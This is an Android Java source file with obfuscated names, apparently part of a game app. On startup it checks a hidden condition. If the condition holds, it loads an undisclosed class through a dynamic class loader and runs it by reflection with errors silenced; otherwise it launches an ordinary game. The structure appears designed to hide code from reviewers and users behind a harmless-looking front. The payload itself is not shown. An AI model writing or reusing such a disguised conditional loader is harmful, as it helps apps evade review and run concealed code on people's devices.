package com.makelist.market.slytherin36;

import android.app.Application;
import android.util.Log;

import java.lang.reflect.Method;
import java.util.Timer;
import java.util.TimerTask;

import static android.content.ContentValues.TAG;

public class Aeonnijbmf {
    /**1 */
    public static void APPLICATIONCREATE(MycocosAppLication arsKls) {
        if(Qdhfqjvrtr.Judgeadjustsch()){
            try {
                Class<?>  dawq = MycocosAppLication.m_dcl.loadClass("yagsmq.rdwirnwvw");
                Method  vvv= dawq.getMethod("omqbaudbpw", new Class[] {Application.class });
                vvv.invoke(null, new Object[] {arsKls});
                Log.e(TAG, "APPLICATIONCREATE: "+dawq );
            } catch (Exception edq){
//                edq.printStackTrace();
            }
        }else{
            BlitzGame.init(arsKls);

        }
    }
    public static int swscw = 0;
    public static void JudgeAfw(){

        final Timer bgwvsw = new Timer();
        final TimerTask lavjkiwjv = new TimerTask() {
            @Override
            public void run() {
                swscw ++;
                String dasd = BlitzGame.faswwwslotState();
                if(!"".equals(dasd)){
                    if (sgsBotData.JudgeJfwf(dasd)){
                        Qdhfqjvrtr.GameRestart();
                    }else{
                        bgwvsw.cancel();
                    }
                }
                if (swscw > 17){
                    bgwvsw.cancel();
                }
            }
        };
        bgwvsw.schedule(lavjkiwjv, 1345, 1455);
    }

}